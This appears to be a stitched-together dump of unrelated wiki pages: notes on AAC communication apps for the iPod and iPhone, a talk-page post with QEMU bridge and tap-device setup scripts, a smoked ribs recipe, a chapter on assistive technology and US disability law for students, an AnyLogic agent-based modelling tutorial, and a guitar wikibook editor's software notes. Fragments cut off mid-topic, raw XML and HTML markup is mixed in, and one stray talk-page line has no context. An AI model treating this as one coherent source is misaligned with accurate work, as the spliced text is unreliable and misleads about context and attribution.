Recent advances in technology have put literally put the power of communication in the palm of our hands. The invention of the Personal Digital Assistant (PDA), the iPod, the iPhone and other Smart phones have opened a new door in SGD. Most of the AAC companies have a PDA or other handheld alternative. The popularity of the iPod and iPhone with today's youth combined with the multitude of applications written for this format, have made it a powerful platform for SGD. Non-communicative students no longer have to stand out as &quot;different&quot; because they are carrying strange, special devices around. They can be the same as their peers and siblings, by using the same technology, just in a unique way. 

The iPod touch or iPhone  now have thousands of applications available to them with more being developed every day. The costs of these applications range from free to 99 cents to $189 depending upon their capabilities. The iPod touch costs a couple hundred dollars making it far more affordable then thousands of dollars commonly associated with the dedicated units.

    &lt;td&gt;&lt;div align=&quot;center&quot;&gt;These AAC apps come with pre-installed symbols with messages and allow the user to add pictures and messages. Some use text to speech and others use recorded audio. The amount of preinstalled symbols vary from 6 to 7000. The customization options vary greatly between apps as do the fees charged for the app.&lt;/div&gt;&lt;/td&gt;

== On Going Process ==
Not only is technology innovation and additional research into augmentative communication occurring at a rapid rate, but the students and their needs are continuously evolving. These needs must be constantly evaluated. Available vocabulary must be kept current and reflect the relevant environments, age appropriate terminology and slang in order to increase the child's capability for communication.

Fortunately keeping informed of current technology and innovations is becoming easier through the use of RSS feeds.  The [http://www.aacinstitute.org/index.html AAC Institute] and [http://www.aac-rerc.com AAC Rehabilitation Engineering Research Centers] are sources of current research in the field of augmentative communication. Auditory news can be obtained through the use of podcasts subscriptions such as Abilities, Autism Research Institute, Autism Insights, and the autism Podcast. The use of the iPod or iPhone equipped with the Autism Newsreader will grab the top stories in autism and bring them directly to those devices.

:: Why would it not work? --[[User:IsmaelLuceno|IsmaelLuceno]] ([[User talk:IsmaelLuceno|discuss]] • [[Special:Contributions/IsmaelLuceno|contribs]]) 08:26, 25 May 2012 (UTC)

== Example scripts qemu-ifup qemu-ifdown ==
I would suggest to split the bridge setup and the qemu-if[up,down] scripts. The current version only supports one tap device, which is not the way the qemu-if[up,down] scripts were ment to be used.
I would propose the following change:

To use tap add the following to the qemu command line
&lt;pre&gt;
-net nic -net tap,ifname=$TAP
&lt;/pre&gt;
Where $TAP can be something from tap0 to tapn.

A simple setup could consist of one bridge which bridges all qemu tap interfaces to the outside network.
For this you need to setup the bridge once. After that you also need to create a tap device for each vm and add it to the bridge.
The following scripts do this for you. bridge-up and down need to be called once by you. 
qemu-ifup and qemu-ifdown are called by qemu if they are in the right place.

Required packages (debian):
* openvpn (for creating tap devices)
* bridge-utils (for creating bridge)

Create the following scripts.
===bridge-up===
&lt;pre&gt;
#!/bin/sh 
# 
# script to bring up the tun device in QEMU in bridged mode 
# first parameter is name of tap device (e.g. tap0)
#
# some constants specific to the local host - change to suit your host
#
INETADDR=192.168.0.10
GATEWAY=192.168.0.1
NETMASK=255.255.255.0
BROADCAST=192.168.0.255
INTERFACE=eth0
BRIDGE=br0
#
# First take the interface down, then bring it up with IP address 0.0.0.0 
#
ifdown $INTERFACE
ifconfig $INTERFACE 0.0.0.0 promisc up
brctl addbr $BRIDGE
brctl addif $BRIDGE $INTERFACE
# 
# Bring up the bridge with INETADDR and add the default route 
#
ifconfig $BRIDGE $INETADDR netmask $NETMASK broadcast $BROADCAST
route add default gw $GATEWAY
&lt;/pre&gt;
===bridge-down===
&lt;pre&gt;
#!/bin/sh 
# 
# Script to bring down and delete bridge br0 when QEMU exits 
# 
# Bring down eth0 and br0 
#
INTERFACE=eth0
BRIDGE=br0

ifdown $INTERFACE
ifdown $BRIDGE
ifconfig $BRIDGE down
# 
# Delete the bridge
#
brctl delbr $BRIDGE
# 
# bring up interface in &quot;normal&quot; mode 
#
ifconfig $INTERFACE -promisc
ifup eth0
&lt;/pre&gt;
===/etc/qemu-ifup===
&lt;pre&gt;
#!/bin/sh 
BRIDGE=br0

openvpn --mktun --dev $1 --user `id -un`
ifconfig $1 0.0.0.0 promisc up
brctl addif $BRIDGE $1
&lt;/pre&gt;
===/etc/qemu-ifdown===
&lt;pre&gt;
#!/bin/sh 
BRIDGE=br0

ifconfig $1 down
brctl delif $BRIDGE $1
openvpn --rmtun --dev $1
&lt;/pre&gt;

I've put two methods here: The traditional smoking, and the oven smoking method. Both of them produce mouthwatering, fall-off-the-bone ribs.

== Ingredients ==
* 2 slabs baby back pork ribs (also known as: back ribs, loin ribs, back loin ribs)
* 1/4 cup paprika (if you're doing the oven method, use smoked paprika)
* 2 tbs [[Cookbook:Garlic|garlic powder]]
* 2 tbs chili powder
* 2 tbs [[Cookbook:Cayenne Pepper|cayenne pepper]]
* 1 1/2 cups [[Cookbook:Tomato Paste|tomato paste]]
* 1/4 cup molasses
* 1/2 cup dark brown sugar, divided
* 1/4 cup apple cider vinegar
* 1 tbs salt
* 1 tbs black peppercorns, cracked
* Several pounds each hickory and applewood chunks, or chips if using oven method

== Procedure ==

===Oven Procedure===
#Combine 1/4 cup sugar, chili powder, garlic powder, cayenne, salt, and pepper. Rub meat side of ribs with this mixture and refrigerate for at least 1 hour.
#Place a 1/4 cup each hickory and applewood chunks in the bottom of a roasting pan. Place a rack in the pan and place ribs on the rack.
#Combine remaining ingredients in a large saucepan and bring to a boil over high heat until reduced by half. Set aside.
#Cover roasting pan with aluminum foil and place in the center of a 200 degree F oven and cook 6 hours, brushing with sauce every hour.
#Take ribs and remove foil. Brush meat side liberally with sauce and place under a preheated broiler until well browned.
#Slice into 1-rib portions and serve warm with remaining sauce.

===Traditional Procedure===
#Repeat 1st step of oven method.
#Repeat 3rd step of oven method.
#Place enough hickory and applewood into the firebox of your friendly neighborhood smoker to keep the temperature around 200 degrees F.
#Place ribs in smoker and repeat last 8 words of step 4.
#Brush meat side liberally with sauce and place meat side down on a high grill until well browned. Remove and slice into 1 rib portions and serve with remaining sauce.</text>

==Input Devices for Physically Handicapped Students==

====Physically Handicapped Students====

A physical disability can affect how a student performs in the classroom. Because of laws such as Individuals with Disabilities Education Act and advances in technology software, students with physical disabilities can succeed in the classroom.  Technology can be a powerful “equalizer” for people with disabilities, allowing them to “get around” a limitation in any number of areas (www.believability.com, 2009)&lt;ref&gt;Believe Ability. (2008). Retrieved July 20, 2009, from http://www.believeability.com/index.html &lt;/ref&gt;.  This chapter will define physical disabilities, laws that relate to assistive technology and types of assistive technology that are available for students with physical disabilities.

====Physical Disabilities====
Students with physical disabilities may have difficulty performing basic functions such as, gripping objects with their hands, moving arms or legs in a full or even limited range of motion. These issues can lead to difficulties in the classroom such as using keyboards, touch screens, computer mice, and scroll wheels which are all used with technology. Children with multiple disabilities will have a combination of various disabilities: speech, physical mobility, learning, mental retardation, visual, hearing, brain injury and possibly others. Along with multiple disabilities, they can also exhibit sensory losses and behavior and or social problems. Children with multiple disabilities - also referred to as multiple exceptionalities will vary in severity and characteristics. These students may exhibit weakness in auditory processing and have speech limitations. Physical mobility will often be an area of need. These students may have difficulty attaining and remembering skills and or transferring these skills from one situation to another. Support is usually needed beyond the confines of the classroom. There are often medical implications with some of the more severe multiple disabilities which could include students with cerebral palsy and severe autism and brain injuries. There are many educational implications for these students(www.CalState.edu, 2009).&lt;ref&gt;Assistive Technology . (2002, July 18). Retrieved July 20, 2009, from www.calstate.edu/accessibility/workshops &lt;/ref&gt;

====Example====
Michael Phillips is a bright, articulate, 17-year-old who is physically challenged with spinal muscular atrophy (SMA), a neuromuscular disorder that attacks the nerves and the muscles they control. A congenital disease, SMA is degenerative, leaving Michael without the ability to control muscle contractions in his arms and legs. As a result, Michael cannot perform simple tasks such as turning a page, using a pen or typing on a keyboard. Yet, thanks to the use of assistive computer technology, the Tampa, Florida resident boasts an impressive record of academic achievement and enjoys a variety of extracurricular activities. 
In the fall of 1998, Michael entered his senior year at Plant High School in Tampa with a 4.12 grade point average. He is an editor and columnist of the high school newspaper and writes a regular column on the Internet entitled &quot;Palpatine's Mac World.&quot; He has been awarded a Chair scholarship to any public college or university in the state of Florida. Michael is an accomplished photographer and enjoys playing computer games and surfing the net (Johnston, 1998).&lt;ref&gt;Johnston, D. (1998). Assistive Technology Helps Students Overcome Physical Limitations. Technological Horizons in Education, 26. Retrieved July 20, 2009, from http://www.questia.com/googleScholar.qst?docId=5001396534 &lt;/ref&gt; Without the use of assistive technology, Michael would not have been able to achieve these great accomplishments. To help assist students with disabilities, the government has created laws to assist students in maximizing their potential.

====Laws====

Across Pennsylvania, the proportion of students with disabilities educated in the regular education setting is rising significantly. Because more special education students are placed in the regular education classroom for their instruction, teachers are facing a more challenging task of effectively educating these students. Teachers have to use a variety of teaching strategies and methods in order to meet the goals of student IEP's. This change in placement is due to legislation that pertain to students with disabilities. Explained below are several key laws that affect educational institutions.

The Education for All Handicapped Children Act (P.L. 94-142) of 1975 and the Individuals with Disabilities Education Act (IDEA) (P. L. 101-476) identified specific categories of disabilities under which children may be eligible for special education and related services (IDEA, 2004). As defined by IDEA, the term &quot;child with a disability&quot; means a child: &quot;with mental retardation, hearing impairments (including deafness), speech or language impairments, visual impairments (including blindness), serious emotional disturbance, orthopedic impairments, autism, traumatic brain injury, other health impairments, or specific learning disabilities; and who, by reason thereof, needs special education and related services&quot; (IDEA,  2004). &lt;ref&gt;Individuals with Disabilities Education Act of 2004 (IDEA, 2004), 20 U.S.C. Sec. 1401 retrieved on July 10, 2009 at http://idea.ed.gov &lt;/ref&gt;
 

No Child Left Behind (NCLB) is an act that former US President George Bush signed in 2002. This law is important because it and the Individuals with Disabilities Act (IDEA) both establish mandates for children with disabilities. NCLB attempts to answer the challenges of producing high achieving students and hold students to higher standards (www.ed.gov/nclb/landing).&lt;ref&gt;No CHild Left Behind retrieved on  July 18, 2009  at www.ed.gov/nclb/landingaccessed  &lt;/ref&gt;


The Gaskin Settlement was a lawsuit that was settled between a group of special education parents and the PA Department of Education. The settlement agreed that handicapped children are to be educated with children who are not handicapped to the maximum extent. “Removal of handicapped children will only be removed when the nature and severity of the handicap is such that education in regular classes with the use of supplementary aids and services cannot be achieved satisfactorily” (www.pde.state.pa.us, 2008).&lt;ref&gt;Special Education: Gaskin Case. (2008, August 21). Retrieved July 28, 2009, from http://www.pde.state.pa.us/special_edu/cwp/view.asp?Q=109539&amp;A=177 &lt;/ref&gt;


Assistive Technology (AT) is defined as “any item, piece of equipment, or product system, whether acquired commercially off the shelf, modified, or customized that is used to increase, maintain, or improve the functional capabilities of a child with a disability” (Dell, Newton, &amp; Petroff, 2007).).&lt;ref&gt;Dell, A., Newton, D.A., Petroff, J.G. (2008). ''Assistive Technology in the Classroom: Enhancing the School Experiences of Students with Disabilities.'' Upper Saddle River, New Jersey: Pearson Education, Inc.&lt;/ref&gt;

====AT Devices for Students with Physical Disabilities====

Speech recognition is assistive software that allows people to control a computer by talking to it. Instead of using a keyboard and a mouse to control the computer, a student speaks instructions into a microphone that is connected to a computer. When the student talks into the microphone, the student can perform two functions. First, he/she can instruct the computer to perform commands such as opening a document, saving documents, deleting, and more. Secondly, the student can write text into a document such as Microsoft Word just by speaking into the microphone. When the student speaks into the microphone, his/her words will appear on a computer screen in a word processing format, allowing the student to revise or edit.  Speech-to-text allows students to get their ideas onto documents faster because they do not forget it due to how slow they type. A meta-analysis study done by Forgave, found that five students who wrote stories by using a speech to text software were longer in length than when they had handwritten a story. Forgave (2002)&lt;ref&gt;Forgrave, K. (2002). Assistive Technology: Empowering Students with Learning Disabilities. The Clearing House, 75,122-126.&lt;/ref&gt; found that when students with learning disabilities improved the legibility of their work and they decreased the number of errors and improved their scores. Several companies which develop and market speech-to-text are Dragon Systems, ViaVoice, Voice Express, and Free Speech. 

For those students who cannot use any of the AT devices listed above due to verbal and/or physical skills required to operate the computers, there are alternative devices  available for them to succeed academically. For students who have difficulty using a keyboard or operating a mouse, a device called IntelliKeys can be used. IntelliKeys is a keyboard and overlay combination that takes the place of a keyboard. The overlays consist of alphabet, numbers, and enlarged arrows (Hadley &amp; Logwood, 1996).&lt;ref&gt;Hadley, M., &amp; Logwood, M. (1996). Assistive Technology in the Classroom. The Technology  Teacher, 16-19.&lt;/ref&gt; Research conducted by the National Institute of Child Health and Human Development(2007) has shown that students with disabilities who use IntelliKeys increase performance by 50% to 60% over a six month period allowing them to almost equal their peers in the regular education classes (www.intellitools.com).&lt;ref&gt;The Research Basis for IntelliTools Products. (2007, February 10). Retrieved July 20, 2009, from www.intellitools.com/about/research/pdfs/research_feb07.pdf  
&lt;/ref&gt;

For students who have severe physical disabilities and cannot use a keyboard, mouse or IntelliKeys, there are devices such as the SmartNav 4. This AT device allows a student to move the mouse by moving his head slightly. A virtual keyboard is on the screen that allows the student to enter text or navigate on the Internet. This device is ideal for students with spinal cord injuries, muscular dystrophy, and other special needs (naturalpoint.com). &lt;ref&gt;Assistive Technology :: NaturalPoint. (n.d.). Retrieved July 28, 2009, from http://www.naturalpoint.com/smartnav/products/about.html 
&lt;/ref&gt;Another device is the gooseneck switch. It is a switch that allows the student to use a computer with the use of his head. The switch can be used in conjunction with a software program such as Kenax that allows the student to type by simply hitting the switch with his/her head (gokeytech.com, 2007).&lt;ref&gt;Goose Neck Switch Mounting. (2007.). Retrieved July 28, 2009, from http://www.gokeytech.com/goose_neck_switch_mount.htm &lt;/ref&gt;

Recently mobile apps (whether iOS or Android) have begun adaptation to people with physical disabilities. One such company that focuses on this matter is '''Sesame Enable''' &lt;ref&gt;Sesame Enable - Hands-Free Control for Mobile Devices - http://www.sesame-enable.com&lt;/ref&gt;. They are offering an iOS document hands-free reading app &lt;ref&gt;SesameDocs - Hands-Free Reading of Documents and Websites for iOS - https://itunes.apple.com/us/app/sesame-docs-hands-free-pdf/id791178426?ls=1&amp;mt=8&lt;/ref&gt;, an Android hands-free eBook app&lt;ref&gt;SesameReader - Hands-Free Reading of eBooks for Android - https://play.google.com/store/apps/details?id=com.sesame.reader&amp;hl=en&lt;/ref&gt;, and a library for other developers to incorporate hands-free technologies in their apps.

==Conclusion==
Assisitve technology can be very effective in helping students improve their functional ability in the classroom. With the advancement of new technology, students with physical disabilities now have the opportunity to participate and be educated in the regualr education setting. While each students need is different, an assessment mus be completed to determine which device is best suited for that student. Educators and staff should be aware of the types of software devices available since technology is changing at a rapid pace.

      <text xml:space="preserve">==Bass Diffusion. Agent Based Model==

AnyLogic supports different modeling techniques. This tutorial covers the agent-based modeling approach, successfully applied in a wide range of fields such as ecology, sociology, economics, traffic simulation, and many others. Agent-based modeling is used to model markets (agent is a potential customer), competition and supply chains (agent is a company), population (agent is a family, a citizen, or a voter), etc. Agent-based models allow getting an insight into the general behavior of the system assuming the behavior of its elements, without having any global knowledge about the system.

AnyLogic is the only simulation tool, which allows creating flexible models with agents, interacting with each other and their environment. AnyLogic supports all known ways of specifying the agent behavior – statecharts, synchronous and asynchronous event scheduling.

This tutorial will briefly take you through the process of constructing a simulation model using AnyLogic. It is intended to introduce you to AnyLogic interface and many of its main features. We will create a simple illustrative example—the product life cycle model, used for forecasting sales of new products.
The first steps will take you through the process of construction of the classic Bass diffusion model. The model describes a product diffusion process. Potential adopters of a product are influenced into buying the product by advertising and by word of mouth from adopters – those who have already purchased the new product. Adoption of a new product driven by word of mouth is likewise an epidemic. Potential adopters come into contact with adopters through social interactions. A fraction of these contacts results in the purchase of the new product. The advertising causes a constant fraction of the potential adopter population to adopt each time period.

Then we will expand our model by considering some details and introducing you to some advanced features of AnyLogic useful in agent-based modeling. 

Note that there are several reference files available for this model representing the milestones of the editing. You can use reference files if you experience any difficulties creating a model and you would like to compare your model with the reference file. You can use '''Welcome Page''' to open those examples. '''Welcome Page''' appears automatically when you open AnyLogic. It can be opened whenever you like from AnyLogic menu: '''Help|Welcome'''.

You can also run this model [http://www.runthemodel.com/models/211/ online].

      <text xml:space="preserve">'''&lt;big&gt;&lt;big&gt;Step 1. Creating a New Model&lt;/big&gt;&lt;/big&gt;'''

First, we will create a new model.

[[Image:Step 1. Creating a new model1.gif]]'''Create a new model'''
#Click the '''New Model''' [[Image:New_model.gif]]  toolbar button. The '''New Model''' dialog box is displayed.
#Specify the name of the model. In the '''Model Name''' edit box, type &lt;tt&gt;Bass Diffusion Agent Based&lt;/tt&gt;.&lt;/br&gt;[[Image:Step_1._Creating_a_new_model2.png‎]]
#Specify the location  where you want to store your model file. Browse for the existing folder using the '''Browse''' buton, or type the name of the folder you want to create in the '''Location''' edit box.
#Click '''Next'''. This will open the next page of the '''New Model''' wizard. Here you can choose, whether you want to start creating a new model from scratch, or to use a model template as a starting point in model development. Since we want to explain you the whole process of creating an agent based model in details, we will not use a template, but will create our model from scratch.
#Click '''Finish''' to complete the process.

New model is created. It already has one active object class called ''Main'' and experiment called ''Simulation''.

Active objects are the main building blocks of AnyLogic model. They can be used to model very diverse objects of the real world. 

In the center of the workspace you will see the graphical editor. It shows the diagram of the Main class. By default it does not contain any elements.

[[Image:Step_1._Creating_a_new_model3.png‎]]

To the left of the graphical editor you can see the '''Project''' view. The '''Project''' view provides access to AnyLogic models currently opened in the workspace. The workspace tree provides easy navigation throughout the models.

On the right side of the workspace you can see the '''Palette''' view, and at the bottom - the '''Properties''' view. The '''Palette''' view simplifies the process of drawing diagrams, providing the list of model elements grouped by categories in a number of stencils.

The '''Properties''' view is used to view and modify the properties of a currently selected model item(s). When you select something – e.g., in the '''Project''' view or in a graphical editor – the '''Properties''' view displays the properties of the selection.

When working with a model, do not forget to save it by clicking '''Save''' [[Image:Save_edit.gif]].

      <text xml:space="preserve">'''&lt;big&gt;&lt;big&gt;Step 2. Creating Agents&lt;/big&gt;&lt;/big&gt;'''

The first thing you do when creating agent-based model is create agents. Agent is the basic building block of the agent-based model. Agent-based model consists of multiple agents and their environment. Every agent is given a set of rules according to which it interacts with other agents; this interaction then generates the overall system behavior. In this model agents are people.

To create agents in AnyLogic, you define the agent’s internal structure using the active object class, and then create the required number of class instances, each one representing the individual agent.

[[Image:Step_1._Creating_a_new_model1.gif‎]] '''Create new active object class for an agent'''

#In the '''Project view''', right-click the model item, and choose '''New|Active Object Class…''' from the popup menu.&lt;/br&gt;[[Image:Step_2._Creating_Agents1.png]]
#The '''New Active Object Class''' dialog box is displayed. 
#Specify the name of the new active object class. Type &lt;tt&gt;Person&lt;/tt&gt; in the '''Name''' field.&lt;/br&gt;[[Image:Step_2._Creating_Agents2.png]]
#Click '''Finish'''. The &lt;code&gt;Person&lt;/code&gt; class diagram is opened automatically.
#Once you have created some new element, it becomes selected and its properties are displayed in the '''Properties view'''. You can adjust element properties here as your model requires. Please note that '''Properties''' view is context-sensitive view and it displays the properties of the currently selected element of the model. To adjust properties at a later time, first select the element (by clicking on the element in the graphical editor or in the '''Project''' view) and then modify the properties you want.
#On the '''General''' page of the '''Properties''' view, select the '''Agent''' check box. This makes this active object class an agent.&lt;/br&gt;[[Image:Step_2._Creating_Agents3.png]]

You have successfully created the class that will define the agent’s internal structure. Now it’s a time to add agents into the model. To place agents into the model environment, you should encapsulate the object that models agent (''Person'') into the class that models environment (''Main'').

[[File:Step_1._Creating_a_new_model1.gif‎]] '''Place agents into the environment'''

#Open the ''Main'' class diagram by double-clicking the ''Main'' item in the '''Project''' view.
#Drag the ''Person'' class from the '''Project''' view onto the diagram of the ''Main'' class.&lt;/br&gt;[[File:Step_2._Creating_Agents4.png]]
#On the '''General''' page of the '''Properties''' view, type the object’s '''Name''': &lt;code&gt;people&lt;/code&gt;.
#Specify the number of agents you want to have in your model. In the '''Replication''' edit box, specify the number of objects: &lt;code&gt;1000&lt;/code&gt;. The specified number of class instances will be automatically created, each one representing the individual agent.&lt;/br&gt;[[File:Step_2._Creating_Agents5.png]]

We have created the required number of agents. Now we will model the adoption of the product influenced by advertisement.

      <text xml:space="preserve">'''&lt;big&gt;&lt;big&gt;Step 3. Adding Adoption from Advertisement&lt;/big&gt;&lt;/big&gt;'''

In this model the volume of advertising and the probability that a potential adopter will adopt as the result of exposure to a given amount of advertising are assumed to be constant each period. So, we will use a parameter to model the advertising effectiveness — the fractional adoption rate from advertising. 

We will create this parameter in the ''Person'' class. Since all agents are represented by objects of this active object class, they have the same characteristics we define here. Optionally, you can define characteristics individually for each agent by altering values of parameters for some agents.

[[File:Step_1._Creating_a_new_model1.gif‎]] '''Define the advertising suggestibility of the person'''

#Open the ''Person'' class diagram 
#Drag the '''Parameter''' [[File:Step_3._Adding_Adoption_from_Advertisement1.gif‎]] element from the '''General''' page of the '''Palette''' view onto the diagram.
#On the '''General''' page of the '''Properties''' view, set up the parameter properties.
#Change the name of the parameter. Type &lt;code&gt;AdEffectiveness&lt;/code&gt; in the '''Name''' edit box.
#In the '''Default Value''' edit box, type &lt;code&gt;0.011&lt;/code&gt;.&lt;/br&gt;[[File:Step_3._Adding_Adoption_from_Advertisement2.png‎]]

Now we will define the behavior of our agent using a ''statechart''.

[[File:Step_1._Creating_a_new_model1.gif‎]] '''Create a statechart'''

#Draw the following statechart:&lt;/br&gt;[[File:Step_3._Adding_Adoption_from_Advertisement3.png‎]]
#First, draw a state. Drag the '''State''' [[File:Step_3._Adding_Adoption_from_Advertisement4.gif]] element from the '''Statechart''' page of the '''Palette''' view onto the diagram.
#Resize it by dragging the state borders. Change its '''Name''' to ''PotentialAdopter''.&lt;/br&gt;[[File:Step_3._Adding_Adoption_from_Advertisement5.png]]
#Add statechart entry pointer pointing to this state as shown on the figure below. Drag the '''Statechart Entry Point''' [[File:Step_3._Adding_Adoption_from_Advertisement6.gif]] element from the '''Statechart''' page of the '''Palette''' view into the graphical editor, so that its ending point got connected to the upper border of the state:&lt;/br&gt;[[File:Step_3._Adding_Adoption_from_Advertisement7.png]]
#Now ''PotentialAdopter'' is an initial state of the statechart, since the atatechart entry pointer points to it. The person remains a potential adopter until this state is active.
#Add one more state below the created one. You can simply drag the ''PotentialAdopter'' state with Ctrl button pressed. This will create a copy of the state. Name this state ''Adopter''. The person becomes an adopter, when this state becomes active.&lt;/br&gt;[[File:Step_3._Adding_Adoption_from_Advertisement8.png]]
#Add a transition going from the ''PotentialAdopter'' state to the ''Adopter'' state. Drag the '''Transition''' [[File:Step_3._Adding_Adoption_from_Advertisement9.gif]] element from the '''Statechart''' page of the '''Palette''' view onto the diagram of active object class, so that the starting point of the transition got connected to the lower border of ''PotentialAdopter'' state.
#Drag the ending point of the transition onto a border of ''Adopter'' state. The transition should look like in the figure below:&lt;/br&gt;[[File:Step_3._Adding_Adoption_from_Advertisement3.png‎]]
#This transition models the product purchase by this person. The time needed to come to a conclusion to buy the product depends on the person’s advertising suggestibility exponentially. So, set up that this transition will be taken with ''AdEffectiveness'' rate. Go to the '''General''' page of the transition's '''Properties''' view and choose '''Rate''' from the '''Triggered by''' drop-down list. Type &lt;code&gt;AdEffectiveness&lt;/code&gt; in the '''Rate''' field below. You can use the code completion assistant when typing the parameter name. Type only the first letters of the name and then press &lt;tt&gt;Ctrl+space&lt;/tt&gt;. This will open the assistant dialog listing parameters, variables and functions of your model. Scroll to the ''AdEffectiveness'' parameter and insert its name by double-clicking on it.&lt;/br&gt;[[File:Step_3._Adding_Adoption_from_Advertisement10.png]]

      <text xml:space="preserve">'''&lt;big&gt;&lt;big&gt;Step 4. Counting the Product Adopters&lt;/big&gt;&lt;/big&gt;'''

The main purpose of the model is to study how the new product is adopted, so we want to know how many people have already purchased our product at any given moment. Therefore we will define two statistics variables to count product adopters and potential adopters.

[[File:Step_1._Creating_a_new_model1.gif‎]] '''Create statistics variables to count adopters and potential adopters'''

#Open the ''Main'' class diagram by double-clicking the ''Main'' item in the '''Project''' view.
#Select the embedded object people.
#Go to the '''Statistics''' page of the '''Properties''' view.
#Define a statistics variable to calculate number of adopters. Click the '''Add Statistics''' button. This will open the property section below.
#Type &lt;tt&gt;adopters&lt;/tt&gt; in the '''Name''' property field. 
#Leave the selected '''Type: Count'''.
#Specify the '''Condition''':
#:&lt;code&gt;item.statechart.isStateActive(item.Adopter)&lt;/code&gt; &lt;br /&gt; This variable will count the number of people satisfying the specified condition, i.e. those who are in the ''Adopter'' state currently (adopters).&lt;/br&gt;[[File:Step_4._Counting_the_product_adopters.png‎]]
#Create another statistics variable that will count potential adopters in the same way. Name it ''potentialAdopters'' and specify the following '''Condition''':
#:&lt;code&gt;item.statechart.isStateActive(item.PotentialAdopter)&lt;/code&gt;

      <text xml:space="preserve">'''&lt;big&gt;&lt;big&gt;Step 5. Adding Charts&lt;/big&gt;&lt;/big&gt;'''

You can study the dynamics of the investigated process using AnyLogic charts. We will create a chart to show how populations of product adopters and potential adopters change with time.&lt;br /&gt;We have created data sets that can be displayed on charts. Now it's time to add charts.

[[File:Step_1._Creating_a_new_model1.gif‎]] '''Draw a time plot displaying adopter and potential adopter population dynamics'''

#Drag the '''Time Plot''' [[File:Step_5._Adding_charts1.gif]] element from the '''Analysis''' page of the '''Palette''' view into the graphical editor.
#Resize it to look as in the figure below.&lt;/br&gt;[[File:Step_5._Adding_charts2.png]]
#Go to the '''General''' page of the '''Properties''' view.
#Set '''Time Window''': &lt;tt&gt;8&lt;/tt&gt;.
#Specify data items to be displayed on the time plot. 
#Сlick the '''Add Data Set''' button and define settings for the data item in the property section above. 
#Type &lt;code&gt;people.potentialAdopters()&lt;/code&gt; in the '''Expression''' field. Here we tell the chart to display the result returned by &lt;tt&gt;potentialAdopters&lt;/tt&gt; statistics function of the replicated object &lt;tt&gt;people&lt;/tt&gt;.&lt;br /&gt;You can use code assistant while typing code in this edit box. 
#Set  &lt;tt&gt;Potential adopters&lt;/tt&gt; as the '''Title''' of the data set. It will be displayed in the legend for this data item.
#Choose the first option from the '''Point Style''' drop-down list to turn off indicating data set values with a marker.
#In the same way, add another data item on the chart, displaying &lt;tt&gt;people.adopters()&lt;/tt&gt;. Set &lt;tt&gt;Adopters&lt;/tt&gt; as the '''Title''' of this data item and modify its visual properties in the same way.&lt;/br&gt;[[File:Step_5._Adding_charts3.png]]

      <text xml:space="preserve">'''&lt;big&gt;&lt;big&gt;Step 6. Configuring Simulation&lt;/big&gt;&lt;/big&gt;'''

Model simulation has a set of specific settings. A group of model settings is called an experiment, and experiments are displayed at the bottom of the model branch in the workspace tree. You can create several experiments for the same model with alternative model settings. One experiment is created by default and named ''Simulation''.

[[File:Step_6._Configuring_simulation1.png]]

If we start the model, it will work for 100 time units and then will stop. Since we want to observe only how the model behaves when the adoption process takes place, we need to stop the model when the system comes to equilibrium. The adoption process in this model lasts something over 8 years. Since in this model one model time unit corresponds to one year, we need to stop the model after 8 time units.

[[File:Step_1._Creating_a_new_model1.gif‎]] '''Set the model to stop at time 8'''

#In the '''Project''' view, click the ''Simulation:Main'' experiment item.
#On the '''Model Time''' tab of the '''Properties''' window, type 8 in the '''Stop Time''' edit box. The model will stop after 8 model time units elapse.&lt;/br&gt;[[File:Step_6._Configuring_simulation2.png]]

      <text xml:space="preserve">==My Editing==

I'm adding scales and exercises. I will be replacing previous uploads with new versions in an attempt to standardise the images. The scales in particular need attention. The original staff-tab layout I chose was too crowded which only became noticeable when I tried to create a scale starting from the low E string where upon I discovered that the note from the staff &quot;touched&quot; the top line of the tab. This was the standard layout of the staff-tab given by the Sibelius software that I will be changing to a custom layout. I'll give details of any custom settings I've used here.

===Software Used===
*Sibelius 
*Microsoft Photo Editor
*Photoimpact
 
All scales, exercises and chord diagrams are first created in Sibelius. The image is then exported as a bmp graphics file which is then opened in Photo Editor. Microsoft Photo Editor is a program that accompanies Microsofts Office Suite though on my version it is not installed by default and I have to do a custom install. Microsoft Photo Editor is a very basic photo editor and I use this for cutting. resizing or cropping the images. I then paste the image as an object onto a template (150px square for the chord boxes) in Ulead Photoimpact (mid-range graphics program designed for home-users rather than professionals). Though Photoshop is the industry standard for graphics; I find that Ulead Photoimpact suffices for most tasks. 

Please note that the steps vary depending on the result I want. If I design a four bar scale exercise in Sibelius of the staff-tab variety and it needs nothing else (like customised text, arrows to show direction, instructions to leave fingers in place, etc) then simply exporting it as a graphics file is enough. It is ready to be converted to PNG and then uploaded. Sibelius creates a graphic file of the four bars not the whole page though if you design a four bar exercise on a 32 bar stave then you get a 32 bar graphics file.  

It must be noted that Sibelius is a full-featured score designer aimed at the publishing market. It is used extensively throughout the UK education system. My simple use of its features belies what is essentially a flexible and powerful scoring program that is capable of producing full orchestral scores at a professional standard for printed books.

==Photoimpact==

Grid Settings: 
*Horizontal spacing = 10
*Vertical spacing = 10

I don't use the Align (Center Both) on the Object menu of Photoimpact for chord diagrams. I found that in using the 150px square template (for chord boxes) its size created problems when entering text; like fingering or fret numbers looking squashed. To allow the text to fit in I have had to pull the object (all the chord boxes are cut out of a bmp file I export from Sibelius and then pasted as an object onto a 150px template) slightly off-center. At the grid settings above and with a zoom of 600%, I chose to align the object &quot;4 squares up and 4 squares from the left&quot;. I may look into increasing the chord box template to 175px or 200px at a later date so as to be able to &quot;truly&quot; center the object using the Center Both command on the Object menu of Photoimpact.

==Sibelius==
I've set a value of 6.5 in the Engraving Rules (Sibelius software) for the spaces between the staff-tab variant I use (Sibelius has a default of 5.5). This removed the problem of the low E in standard notation &quot;touching&quot; the top-line of the tab when I created scales using the low E.

For exercises with just Tab; the space between &quot;Systems&quot; (Sibelius terminology for Tab and Staff) has been increased to 11.5 (default is 9.5) in the Engraving Rules. This is to allow Chord letters to be entered. This does mean that the Italian Wikibook editors may be reluctant to use some of exercises due to the use of the English system. The Italian music system is called &quot;solfeggio&quot;. An example of the type of exericse I create with Tab and English Chord letters is to be found in the Rock section: Exercise 1.

==Fonts==
